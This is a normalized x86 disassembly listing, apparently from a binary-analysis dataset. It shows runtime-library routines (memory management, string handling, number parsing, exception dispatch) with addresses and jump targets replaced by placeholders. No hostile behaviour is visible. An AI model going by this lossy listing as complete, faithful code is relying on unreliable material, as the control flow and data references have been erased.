mov eax ebx
test eax eax
jns r-xdata
sar ecx 0x2
mov edi [ rw-data ]
mov [ edi + ecx * 4 - 0xc ] eax
mov ecx [ edx ]
mov [ ebp - 0x8 ] ecx
mov ecx [ ebp - 0x8 ]
mov [ ecx + 0x4 ] eax
mov ecx [ ebp - 0x8 ]
mov [ eax ] ecx
add ecx 0x3
sar eax 0x2
mov ecx [ rw-data ]
xor edi edi
mov [ ecx + eax * 4 - 0xc ] edi
jmp r-xdata
add eax 0x3
mov eax esi
mov edx [ edx + 0x8 ]
or edx 0x2
mov [ eax ] edx
add eax 0x4
mov [ ebp - 0x4 ] eax
inc [ rw-data ]
sub ebx 0x4
add [ rw-data ] ebx
call sub_403b7c
jmp r-xdata
sub_4022b0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx eax
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
xor ecx ecx
push ebp
push sub_402442
push [ fs : ecx ]
mov [ fs : ecx ] esp
cmp [ rw-data ] 0x0
je r-xdata
call sub_401a34
test al al
jne r-xdata
mov esi ebx
sub esi 0x4
mov ebx [ esi ]
test bl 0x2
jne r-xdata
push rw-data
call sub_401390
mov [ rw-data ] 0x8
mov [ ebp - 0x4 ] 0x8
jmp r-xdata
dec [ rw-data ]
mov eax ebx
and eax 0x7ffffffc
sub eax 0x4
sub [ rw-data ] eax
test bl 0x1
je r-xdata
mov [ rw-data ] 0x9
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
and ebx 0x7ffffffc
mov eax esi
add eax ebx
mov edi eax
cmp edi [ rw-data ]
jne r-xdata
mov eax esi
sub eax 0xc
mov edx [ eax + 0x8 ]
cmp edx 0xc
jl r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ eax ]
test dl 0x2
je r-xdata
sub [ rw-data ] ebx
add [ rw-data ] ebx
cmp [ rw-data ] 0x3c00
jle r-xdata
mov [ rw-data ] 0xa
jmp r-xdata
test edx 0x80000003
je r-xdata
retn
push rw-data
call sub_401398
mov eax edi
cmp [ eax + 0x4 ] 0x0
je r-xdata
and edx 0x7ffffffc
cmp edx 0x4
jge r-xdata
xor eax eax
mov [ ebp - 0x4 ] eax
call sub_403b7c
jmp r-xdata
call sub_401ec8
mov eax esi
sub eax edx
cmp edx [ eax + 0x8 ]
je r-xdata
mov [ rw-data ] 0xb
jmp r-xdata
cmp [ eax ] 0x0
je r-xdata
or [ eax ] 0x1
jmp r-xdata
mov [ rw-data ] 0xb
jmp r-xdata
add ebx edx
mov esi eax
call sub_401bd8
mov [ rw-data ] 0xa
jmp r-xdata
cmp [ eax + 0x8 ] 0xc
jge r-xdata
mov edx ebx
mov eax esi
call sub_401e40
mov edx [ eax + 0x8 ]
add ebx edx
call sub_401bd8
sub_402454
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov esi edx
add esi 0x7
and esi 0xfffffffc
cmp esi 0xc
jge r-xdata
mov ebp eax
sub ebp 0x4
mov edi [ ebp ]
and edi 0x7ffffffc
mov eax ebp
add eax edi
mov ebx eax
cmp edi esi
jne r-xdata
mov esi 0xc
cmp edi esi
jle r-xdata
mov al 0x1
jmp r-xdata
mov eax esi
sub eax edi
mov [ esp + 0x4 ] eax
cmp ebx [ rw-data ]
jne r-xdata
mov edx edi
sub edx esi
mov [ esp ] edx
cmp ebx [ rw-data ]
jne r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
test [ ebx ] 0x2
jne r-xdata
mov eax [ rw-data ]
cmp eax [ esp + 0x4 ]
jl r-xdata
mov ebx eax
test [ ebx ] 0x2
jne r-xdata
mov eax [ esp ]
sub [ rw-data ] eax
mov eax [ esp ]
add [ rw-data ] eax
cmp [ rw-data ] 0xc
jge r-xdata
mov eax [ ebx ]
test eax 0x80000000
je r-xdata
mov edx ebx
mov eax edx
mov ecx [ eax + 0x8 ]
mov [ esp ] ecx
mov ecx [ esp ]
cmp ecx [ esp + 0x4 ]
jge r-xdata
call sub_401ec8
mov ebx ebp
add ebx edi
mov eax [ esp + 0x4 ]
sub [ rw-data ] eax
mov eax [ esp + 0x4 ]
add [ rw-data ] eax
cmp [ rw-data ] 0xc
jge r-xdata
cmp [ esp ] 0xc
jl r-xdata
mov eax ebx
mov edx [ eax + 0x8 ]
add [ esp ] edx
call sub_401bd8
mov eax esi
sub eax edi
add [ rw-data ] eax
mov eax [ ebp ]
and eax 0x80000003
or esi eax
mov [ ebp ] esi
mov al 0x1
mov eax [ esp ]
add [ rw-data ] eax
mov eax [ esp ]
sub [ rw-data ] eax
mov esi edi
jmp r-xdata
xor eax eax
jmp r-xdata
and eax 0x7ffffffc
add eax ebx
mov ebx eax
mov edx [ esp + 0x4 ]
mov eax ebx
call sub_401fcc
test al al
je r-xdata
call sub_401bd8
mov eax [ esp + 0x4 ]
sub [ esp ] eax
cmp [ esp ] 0xc
jl r-xdata
add edx [ esp ]
mov ebx edx
mov eax [ esp ]
sub [ esp + 0x4 ] eax
jmp r-xdata
mov eax esi
sub eax edi
add [ rw-data ] eax
mov eax [ ebp ]
and eax 0x80000003
or esi eax
mov [ ebp ] esi
mov al 0x1
jmp r-xdata
mov eax [ rw-data ]
add [ rw-data ] eax
add esi [ rw-data ]
xor eax eax
mov [ rw-data ] eax
mov esi edi
jmp r-xdata
mov ebx ebp
add ebx esi
mov eax [ esp ]
or eax 0x2
mov [ ebx ] eax
mov eax ebx
add eax 0x4
call sub_401c9c
jmp r-xdata
mov ebx ebp
add ebx edi
jmp r-xdata
add esi [ esp ]
mov ebx ebp
add ebx esi
and [ ebx ] 0xfffffffe
jmp r-xdata
mov eax ebp
add eax esi
mov edx [ esp ]
call sub_401e40
jmp r-xdata
sub_402630
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
xor edx edx
push ebp
push sub_4026e1
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ rw-data ] 0x0
je r-xdata
call sub_401a34
test al al
jne r-xdata
mov edx esi
mov eax ebx
call sub_402454
test al al
je r-xdata
push rw-data
call sub_401390
xor eax eax
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax esi
call sub_402120
mov edi eax
mov eax ebx
sub eax 0x4
mov eax [ eax ]
and eax 0x7ffffffc
sub eax 0x4
cmp esi eax
jge r-xdata
mov [ ebp - 0x4 ] ebx
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
test edi edi
je r-xdata
mov eax esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov [ ebp - 0x4 ] edi
mov edx edi
mov ecx ebx
xchg ecx eax
call sub_4028f0
mov eax ebx
call sub_4022b0
retn
push rw-data
call sub_401398
sub_4026f4
push ebx
test eax eax
jle r-xdata
xor ebx ebx
call [ rw-data ]
mov ebx eax
test ebx ebx
jne r-xdata
mov eax ebx
pop ebx
retn
mov al 0x1
call sub_402850
sub_402714
push ebx
test eax eax
je r-xdata
xor ebx ebx
call [ rw-data ]
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
mov al 0x2
call sub_402850
sub_402734
mov ecx [ eax ]
test ecx ecx
je r-xdata
test edx edx
je r-xdata
test edx edx
je r-xdata
retn
push eax
mov eax edx
call [ rw-data ]
pop ecx
or eax eax
je r-xdata
mov [ eax ] edx
mov eax ecx
call [ rw-data ]
or eax eax
jne r-xdata
push eax
mov eax ecx
call [ rw-data ]
pop ecx
or eax eax
je r-xdata
mov al 0x1
jmp sub_402850
mov [ ecx ] eax
mov al 0x2
jmp sub_402850
retn
mov [ ecx ] eax
retn
sub_4027c4
push ebx
push esi
call sub_405f10
cmp [ eax ] 0x0
je r-xdata
xor ebx ebx
call sub_405f10
mov esi [ eax ]
mov ebx [ esi + 0x8 ]
call sub_405f10
xor eax eax
mov [ esi + 0x8 ] eax
jmp r-xdata
mov eax ebx
pop esi
pop ebx
retn
sub_402804
push ebx
push esi
mov esi edx
mov ebx eax
and bl 0x7f
cmp [ rw-data ] 0x0
je r-xdata
test bl bl
jne r-xdata
mov edx esi
mov eax ebx
call [ rw-data ]
cmp bl 0x18
ja r-xdata
call sub_405f10
mov ebx [ eax + 0x4 ]
jmp r-xdata
xor eax eax
mov al bl
mov edx esi
call sub_4027f8
xor eax eax
mov al bl
mov bl [ eax + rw-data ]
sub_40288c
push esi
push edi
mov esi eax
mov edi [ esp + 0xc ]
xor eax eax
or al [ esi ]
je r-xdata
mov [ edi ] al
test edx edx
jle r-xdata
mov edx 0x1
jmp r-xdata
cmp edx eax
jg r-xdata
sub eax edx
inc eax
test ecx ecx
jl r-xdata
xor ecx ecx
jmp r-xdata
cmp ecx eax
jg r-xdata
add esi edx
mov [ edi ] cl
inc edi
[ edi ] [ esi ]
jmp r-xdata
mov ecx eax
jmp r-xdata
pop edi
pop esi
retn 0x4
sub_4028f0
push esi
push edi
mov esi eax
mov edi edx
mov eax ecx
cmp edi esi
ja r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
sar ecx 0x2
js r-xdata
je r-xdata
pop edi
pop esi
retn
std
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
add esi 0x3
add edi 0x3
[ edi ] [ esi ]
cld
sar ecx 0x2
js r-xdata
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
pop edi
pop esi
retn
sub_402930
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
jmp r-xdata
mov al [ ebx ]
test al al
je r-xdata
cmp [ ebx ] 0x22
jne r-xdata
cmp al 0x20
jbe r-xdata
xor ebp ebp
mov edi ebx
jmp r-xdata
cmp [ ebx + 0x1 ] 0x22
jne r-xdata
push ebx
call sub_401244
mov ebx eax
mov al [ ebx ]
cmp al 0x20
ja r-xdata
add ebx 0x2
jmp r-xdata
cmp al 0x22
jne r-xdata
mov eax esi
mov edx ebp
call sub_4046e0
mov ebx edi
mov edi [ esi ]
xor esi esi
jmp r-xdata
push ebx
call sub_401244
mov edx eax
sub edx ebx
add ebp edx
mov ebx eax
push ebx
call sub_401244
mov ebx eax
jmp r-xdata
mov al [ ebx ]
cmp al 0x20
ja r-xdata
mov al [ ebx ]
test al al
je r-xdata
cmp al 0x22
jne r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ ebx ] 0x0
je r-xdata
cmp al 0x22
jne r-xdata
push ebx
call sub_401244
cmp eax ebx
jbe r-xdata
push ebx
call sub_401244
mov ebx eax
jmp r-xdata
push ebx
call sub_401244
mov ebx eax
jmp r-xdata
push ebx
call sub_401244
mov edx eax
sub edx ebx
add ebp edx
mov ebx eax
mov dl [ ebx ]
mov [ edi + esi ] dl
inc ebx
inc esi
cmp eax ebx
ja r-xdata
mov al [ ebx ]
test al al
je r-xdata
cmp [ ebx ] 0x0
je r-xdata
cmp al 0x22
jne r-xdata
push ebx
call sub_401244
mov ebx eax
jmp r-xdata
push ebx
call sub_401244
cmp eax ebx
jbe r-xdata
mov dl [ ebx ]
mov [ edi + esi ] dl
inc ebx
inc esi
cmp eax ebx
ja r-xdata
sub_402a1c
push ebx
push esi
push edi
add esp 0xfffffef8
mov ebx edx
mov esi eax
mov eax ebx
call sub_404094
test esi esi
jne r-xdata
call GetCommandLineA
mov edi eax
push 0x105
lea eax [ esp + 0x4 ]
push eax
push 0x0
call sub_401284
mov ecx eax
mov edx esp
mov eax ebx
call sub_404184
jmp r-xdata
add esp 0x108
pop edi
pop esi
pop ebx
retn
cmp [ ebx ] 0x0
je r-xdata
dec esi
jmp r-xdata
mov edx ebx
mov eax edi
call sub_402930
mov edi eax
test esi esi
je r-xdata
sub_402a7c
add esp 0xfffffff8
push esp
call QueryPerformanceCounter
test eax eax
je r-xdata
call sub_40133c
mov [ rw-data ] eax
pop ecx
pop edx
retn
mov eax [ esp ]
mov [ rw-data ] eax
pop ecx
pop edx
retn
sub_402b0c
sub esp 0xc
fnstcw [ esp ]
fnstcw [ esp + 0x2 ]
fwait
or [ esp + 0x2 ] 0xf00
fldcw [ esp + 0x2 ]
fistp [ esp + 0x4 ]
fwait
fldcw [ esp ]
pop ecx
pop eax
pop edx
retn
sub_402b4c
push ebx
mov cx [ eax + 0x4 ]
sub cx 0xd7b1
je r-xdata
xor ebx ebx
jmp r-xdata
dec ecx
sub cx 0x2
jae r-xdata
test ebx ebx
je r-xdata
cmp eax rw-data
je r-xdata
mov ebx edx
call ebx
mov ebx eax
jmp r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
call sub_40287c
xor ebx ebx
jmp r-xdata
cmp eax rw-data
jne r-xdata
mov ebx 0x67
sub_402ba0
push ebx
push esi
mov ebx eax
xor esi esi
mov ax [ ebx + 0x4 ]
cmp ax 0xd7b1
jb r-xdata
cmp ebx rw-data
je r-xdata
cmp ax 0xd7b3
ja r-xdata
mov eax esi
pop esi
pop ebx
retn
mov eax 0x67
call sub_40287c
and ax 0xd7b2
cmp ax 0xd7b2
jne r-xdata
test esi esi
jne r-xdata
mov eax ebx
call [ ebx + 0x1c ]
mov esi eax
test esi esi
je r-xdata
mov eax ebx
call [ ebx + 0x24 ]
mov esi eax
mov eax esi
call sub_40287c
jmp r-xdata
sub_402bf8
push esi
push edi
mov edi eax
xor eax eax
mov al [ edi ]
mov esi edx
xor edx edx
mov dl [ esi ]
inc esi
add al dl
jb r-xdata
mov al cl
sub cl [ edi ]
jbe r-xdata
cmp al cl
ja r-xdata
pop edi
pop esi
retn
mov dl cl
jmp r-xdata
mov ecx edx
mov dl [ edi ]
mov [ edi ] al
inc edi
add edi edx
[ edi ] [ esi ]
sub_402c34
push ebx
mov bl [ edx ]
cmp cl bl
jbe r-xdata
mov [ eax ] cl
inc edx
inc eax
and ecx 0xff
xchg edx eax
call sub_4028f0
pop ebx
retn
mov ecx ebx
sub_402c50
push ebx
push esi
push edi
mov esi eax
mov edi edx
xor eax eax
xor edx edx
mov al [ esi ]
mov dl [ edi ]
inc esi
inc edi
sub eax edx
ja r-xdata
push edx
shr edx 0x2
je r-xdata
add edx eax
pop edx
and edx 0x3
je r-xdata
mov ecx [ esi ]
mov ebx [ edi ]
cmp ecx ebx
jne r-xdata
add eax eax
jmp r-xdata
mov cl [ esi ]
cmp cl [ edi ]
jne r-xdata
pop edx
cmp cl bl
jne r-xdata
dec edx
je r-xdata
pop edi
pop esi
pop ebx
retn
dec edx
je r-xdata
cmp ch bh
jne r-xdata
add esi 0x4
add edi 0x4
mov ecx [ esi + 0x4 ]
mov ebx [ edi + 0x4 ]
cmp ecx ebx
jne r-xdata
mov cl [ esi + 0x1 ]
cmp cl [ edi + 0x1 ]
jne r-xdata
shr ecx 0x10
shr ebx 0x10
cmp cl bl
jne r-xdata
add esi 0x8
add edi 0x8
dec edx
jne r-xdata
dec edx
je r-xdata
cmp ch bh
jmp r-xdata
mov cl [ esi + 0x2 ]
cmp cl [ edi + 0x2 ]
jne r-xdata
sub_402cd4
push ebx
push esi
push ecx
mov esi ecx
shr esi 0x2
je r-xdata
pop esi
and esi 0x3
je r-xdata
mov ecx [ eax ]
mov ebx [ edx ]
cmp ecx ebx
jne r-xdata
pop esi
pop ebx
retn
mov cl [ eax ]
cmp cl [ edx ]
jne r-xdata
pop esi
cmp cl bl
jne r-xdata
dec esi
je r-xdata
dec esi
je r-xdata
cmp ch bh
jne r-xdata
add eax 0x4
add edx 0x4
mov ecx [ eax + 0x4 ]
mov ebx [ edx + 0x4 ]
cmp ecx ebx
jne r-xdata
xor eax eax
pop esi
pop ebx
retn
mov cl [ eax + 0x1 ]
cmp cl [ edx + 0x1 ]
jne r-xdata
shr ecx 0x10
shr ebx 0x10
cmp cl bl
jne r-xdata
add eax 0x8
add edx 0x8
dec esi
jne r-xdata
dec esi
je r-xdata
cmp ch bh
jmp r-xdata
mov cl [ eax + 0x2 ]
cmp cl [ edx + 0x2 ]
jne r-xdata
sub_402d44
push edi
mov edi eax
mov ch cl
mov eax ecx
shl eax 0x10
mov ax cx
mov ecx edx
sar ecx 0x2
js r-xdata
pop edi
retn
[ edi ]
mov ecx edx
and ecx 0x3
[ edi ]
sub_402d80
push ebx
push esi
push edi
mov esi eax
push eax
test eax eax
je r-xdata
inc esi
jmp r-xdata
xor eax eax
xor ebx ebx
mov edi 0xccccccc
pop ebx
sub esi ebx
jmp r-xdata
mov bl [ esi ]
inc esi
cmp bl 0x20
je r-xdata
mov ch 0x0
cmp bl 0x2d
je r-xdata
mov [ edx ] esi
pop edi
pop esi
pop ebx
retn
inc ch
cmp bl 0x2b
je r-xdata
cmp bl 0x24
je r-xdata
mov bl [ esi ]
inc esi
jmp r-xdata
mov edi 0xfffffff
mov bl [ esi ]
inc esi
test bl bl
je r-xdata
cmp bl 0x78
je r-xdata
cmp bl 0x61
jb r-xdata
cmp bl 0x58
je r-xdata
sub bl 0x30
cmp bl 0x9
jbe r-xdata
sub bl 0x20
cmp bl 0x30
jne r-xdata
cmp eax edi
ja r-xdata
sub bl 0x11
cmp bl 0x5
ja r-xdata
test bl bl
je r-xdata
mov bl [ esi ]
inc esi
cmp bl 0x78
je r-xdata
shl eax 0x4
add eax ebx
mov bl [ esi ]
inc esi
test bl bl
jne r-xdata
add bl 0xa
sub bl 0x30
cmp bl 0x9
ja r-xdata
cmp bl 0x58
je r-xdata
dec ch
jne r-xdata
cmp eax edi
ja r-xdata
test bl bl
je r-xdata
pop ecx
xor esi esi
neg eax
lea eax [ eax + eax * 4 ]
add eax eax
add eax ebx
mov bl [ esi ]
inc esi
test bl bl
jne r-xdata
dec ch
je r-xdata
jmp r-xdata
neg eax
jle r-xdata
test eax eax
jge r-xdata
js r-xdata
jmp r-xdata
sub_402e60
push ebx
push eax
cmp ecx 0xff
jbe r-xdata
mov bl [ edx ]
inc edx
test bl bl
je r-xdata
mov ecx 0xff
pop edx
sub eax edx
mov [ edx ] al
pop ebx
retn
inc eax
mov [ eax ] bl
dec ecx
jne r-xdata
sub_402ea0
push ebx
xor ebx ebx
test eax eax
jl r-xdata
neg eax
cmp eax 0x1400
jge r-xdata
je r-xdata
fstp st0
fldz
mov edx eax
and edx 0x1f
lea edx [ edx + edx * 4 ]
fld [ ebx + edx * 2 + sub_402f53 ]
fdivp st1
shr eax 0x5
je r-xdata
pop ebx
retn
cmp eax 0x1400
jge r-xdata
mov edx eax
and edx 0xf
je r-xdata
fstp st0
fld [ ebx + r-xdata ]
jmp r-xdata
mov edx eax
and edx 0x1f
lea edx [ edx + edx * 4 ]
fld [ ebx + edx * 2 + sub_402f53 ]
fmulp st1
shr eax 0x5
je r-xdata
shr eax 0x4
je r-xdata
lea edx [ edx + edx * 4 ]
fld [ ebx + edx * 2 + r-xdata ]
fdivp st1
mov edx eax
and edx 0xf
je r-xdata
lea eax [ eax + eax * 4 ]
fld [ ebx + eax * 2 + r-xdata ]
fdivp st1
jmp r-xdata
shr eax 0x4
je r-xdata
lea edx [ edx + edx * 4 ]
fld [ ebx + edx * 2 + r-xdata ]
fmulp st1
lea eax [ eax + eax * 4 ]
fld [ ebx + eax * 2 + r-xdata ]
fmulp st1
jmp r-xdata
sub_402f53
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x3fff ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x4002 ] ah
add [ eax ] al
add [ eax ] al
add al cl
add eax 0x40
add [ eax ] al
add [ eax ] al
cli
or [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x64 ] al
or al 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
push eax
retn
sub_40318c
push ebx
xor ebx ebx
push 0x0
call GetKeyboardType
cmp eax 0x7
jne r-xdata
mov eax ebx
pop ebx
retn
push 0x1
call GetKeyboardType
and eax 0xff00
cmp eax 0xd00
je r-xdata
mov bl 0x1
cmp eax 0x400
jne r-xdata
sub_4031bc
push ebp
mov ebp esp
add esp 0xfffffff4
movzx eax [ rw-data ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x4 ]
push eax
push 0x1
push 0x0
push r-xdata
push 0x80000002
call sub_4012dc
test eax eax
jne r-xdata
mov ax [ rw-data ]
and ax 0xffc0
mov dx [ ebp - 0x8 ]
and dx 0x3f
or ax dx
mov [ rw-data ] ax
mov esp ebp
pop ebp
retn
xor eax eax
push ebp
push sub_40322d
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0xc ] 0x4
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x0
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call sub_4012e4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call sub_4012d4
retn
sub_4032a8
push ebx
xor ebx ebx
or edx edx
je r-xdata
mov al bl
pop ebx
retn
mov eax [ eax - 0x2c ]
xor ecx ecx
mov cl [ eax ]
cmp ecx [ edx - 0x4 ]
jne r-xdata
dec edx
dec ecx
jne r-xdata
mov bh [ ecx + eax ]
xor bh [ ecx + edx ]
and bh 0xdf
jne r-xdata
inc ebx
sub_403350
push ebx
push esi
push edi
mov ebx eax
mov edi edx
stosd [ edi ]
mov ecx [ ebx - 0x28 ]
xor eax eax
push ecx
shr ecx 0x2
dec ecx
[ edi ]
pop ecx
and ecx 0x3
[ edi ]
mov eax edx
mov edx esp
mov ebx [ ebx - 0x24 ]
test ebx ebx
je r-xdata
push ecx
cmp esp edx
je r-xdata
mov ebx [ ebx ]
jmp r-xdata
pop edi
pop esi
pop ebx
retn
pop ebx
mov ecx [ ebx ]
add ebx 0x4
mov ecx [ ebx - 0x48 ]
test ecx ecx
je r-xdata
add ebx 0x1c
dec ecx
jne r-xdata
mov edi [ ebx + 0x14 ]
mov [ edi + eax ] esi
mov esi [ ebx + 0x10 ]
test esi esi
je r-xdata
cmp esp edx
jne r-xdata
sub_4033a8
push ebx
push esi
mov ebx eax
mov esi eax
test esi esi
jne r-xdata
call sub_404ad0
mov eax ebx
mov esi [ esi ]
mov edx [ esi - 0x40 ]
mov esi [ esi - 0x24 ]
test edx edx
je r-xdata
pop esi
pop ebx
retn
sub_4033c8
xchg ecx edx
cmp ecx 0xff000000
jae r-xdata
and ecx 0xffffff
add ecx eax
mov eax edx
mov edx [ ecx ]
jmp sub_4057f8
cmp ecx 0xfe000000
jb r-xdata
jmp ecx
movsx ecx cx
add ecx [ eax ]
jmp [ ecx ]
sub_4033f8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov esi ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_40347c
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ esi ] eax
mov edx [ ebp - 0x4 ]
mov eax [ edi ]
call sub_40348c
mov ebx eax
test ebx ebx
je r-xdata
cmp [ esi ] 0x0
setne bl
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_403483
lea eax [ ebp - 0x8 ]
call sub_4057e0
retn
mov eax [ ebx + 0x14 ]
test eax eax
je r-xdata
lea ecx [ ebp - 0x8 ]
mov edx [ ebx + 0x18 ]
mov eax edi
call sub_4033c8
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_4057f8
add edi eax
mov [ esi ] edi
cmp [ esi ] 0x0
je r-xdata
mov eax [ esi ]
push eax
mov eax [ eax ]
call [ eax + 0x4 ]
jmp r-xdata
sub_40348c
push ebx
push esi
mov ebx eax
mov ebx [ ebx - 0x24 ]
test ebx ebx
je r-xdata
mov ecx [ eax ]
add eax 0x4
xor eax eax
mov ebx [ ebx ]
jmp r-xdata
add eax 0x1c
dec ecx
jne r-xdata
mov esi [ edx + 0x4 ]
cmp esi [ eax + 0x4 ]
jne r-xdata
mov eax [ ebx - 0x48 ]
test eax eax
je r-xdata
mov esi [ edx ]
cmp esi [ eax ]
jne r-xdata
mov esi [ edx + 0x8 ]
cmp esi [ eax + 0x8 ]
jne r-xdata
mov esi [ edx + 0xc ]
cmp esi [ eax + 0xc ]
je r-xdata
pop esi
pop ebx
retn
sub_4034d0
push ebx
push esi
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx ]
call sub_403570
test al al
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_403510
push edi
xchg esi eax
jmp r-xdata
mov edi [ esi - 0x30 ]
test edi edi
je r-xdata
mov esi [ esi - 0x24 ]
test esi esi
jne r-xdata
movzx ecx [ edi ]
push ecx
add edi 0x2
[ edi ]
je r-xdata
mov esi [ esi ]
pop edi
retn
pop eax
add eax eax
sub eax ecx
mov esi [ edi + eax * 2 - 0x4 ]
pop edi
retn
pop ecx
sub_403540
push eax
push ecx
mov eax [ eax ]
call sub_403510
pop ecx
pop eax
je r-xdata
pop ecx
jmp r-xdata
jmp esi
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0xd2
jmp sub_404088
call [ rw-data ]
sub_403558
push esi
mov esi edx
mov eax [ eax ]
call sub_403510
mov eax esi
pop esi
jne r-xdata
retn
pop ecx
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0xd2
jmp sub_404088
call [ rw-data ]
sub_4035a0
push esi
mov si [ edx ]
or si si
je r-xdata
pop esi
mov ecx [ eax ]
jmp [ ecx - 0x10 ]
cmp si 0xc000
jae r-xdata
push eax
mov eax [ eax ]
call sub_403510
pop eax
je r-xdata
mov ecx esi
pop esi
jmp ecx
sub_4035c8
push ebx
push esi
push edi
xor ecx ecx
xor edi edi
mov bl [ edx ]
jmp r-xdata
mov esi [ eax - 0x34 ]
test esi esi
je r-xdata
mov eax [ eax - 0x24 ]
test eax eax
jne r-xdata
mov di [ esi ]
add esi 0x2
mov eax [ eax ]
jmp r-xdata
mov ch 0x0
mov cx [ esi ]
add esi ecx
dec edi
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov bl [ edx ]
jmp r-xdata
dec ecx
jne r-xdata
mov cl [ esi + 0x6 ]
cmp cl bl
je r-xdata
mov bl [ ecx + esi + 0x6 ]
xor bl [ ecx + edx ]
and bl 0xdf
jne r-xdata
mov eax [ esi + 0x2 ]
sub_403618
push ebx
push esi
push edi
xor ecx ecx
xor edi edi
mov bl [ edx ]
push eax
mov eax [ eax - 0x24 ]
test eax eax
jne r-xdata
mov di [ esi ]
add esi 0x6
mov eax [ eax ]
mov esi [ eax - 0x38 ]
test esi esi
je r-xdata
pop edx
jmp r-xdata
mov bl [ ecx + esi + 0x6 ]
xor bl [ ecx + edx ]
and bl 0xdf
jne r-xdata
lea esi [ ecx + esi + 0x7 ]
dec edi
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov bl [ edx ]
mov cl [ esi + 0x6 ]
jmp r-xdata
dec ecx
jne r-xdata
mov cl [ esi + 0x6 ]
cmp cl bl
je r-xdata
mov eax [ esi ]
pop edx
add eax edx
sub_403668
push edx
push ecx
push ebx
test dl dl
jl r-xdata
xor edx edx
lea ecx [ esp + 0x10 ]
mov ebx [ fs : edx ]
mov [ ecx ] ebx
mov [ ecx + 0x8 ] ebp
mov [ ecx + 0x4 ] sub_403691
mov [ ecx + 0xc ] eax
mov [ fs : edx ] ecx
pop ebx
pop ecx
pop edx
retn
call [ eax - 0xc ]
sub_4036fc
cmp [ rw-data ] 0x0
je r-xdata
retn
push eax
push eax
push edx
push esp
push 0x2
push 0x0
push 0xeedfae4
call [ rw-data ]
add esp 0x8
pop eax
sub_403738
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push eax
push [ ebx + 0x4 ]
jmp r-xdata
push esp
push 0x1
push 0x0
push 0xeedfae0
call [ rw-data ]
add esp 0x4
pop eax
retn
sub_40374c
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push eax
push ebx
jmp r-xdata
push esp
push 0x1
push 0x0
push 0xeedfae0
call [ rw-data ]
add esp 0x4
pop eax
retn
sub_403760
test ecx ecx
je r-xdata
retn
mov eax [ ecx + 0x1 ]
cmp [ ecx ] 0xe9
je r-xdata
add ecx 0x5
cmp [ ecx ] 0xeb
jne r-xdata
movsx eax al
inc ecx
inc ecx
jmp r-xdata
add ecx eax
sub_403780
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push eax
push edx
push ecx
call sub_403760
push ecx
push esp
push 0x1
push 0x0
push 0xeedfae1
call [ rw-data ]
pop ecx
pop ecx
pop edx
pop eax
sub_4037e4
mov eax [ esp + 0x4 ]
test [ eax + 0x4 ] 0x6
jne r-xdata
mov eax 0x1
retn
cmp [ eax ] 0xeedfade
mov edx [ eax + 0x18 ]
mov ecx [ eax + 0x14 ]
je r-xdata
cmp [ rw-data ] 0x1
jbe r-xdata
cld
call sub_403280
mov edx [ rw-data ]
test edx edx
je r-xdata
or [ eax + 0x4 ] 0x2
push ebx
xor ebx ebx
push esi
push edi
push ebp
mov ebx [ fs : ebx ]
push ebx
push eax
push edx
push ecx
mov edx [ esp + 0x28 ]
push 0x0
push eax
push r-xdata
push edx
call [ rw-data ]
mov edi [ esp + 0x28 ]
call sub_405f10
push [ eax ]
mov [ eax ] esp
mov ebp [ edi + 0x8 ]
mov ebx [ edi + 0x4 ]
mov [ edi + 0x4 ] r-xdata
add ebx 0x5
call sub_40374c
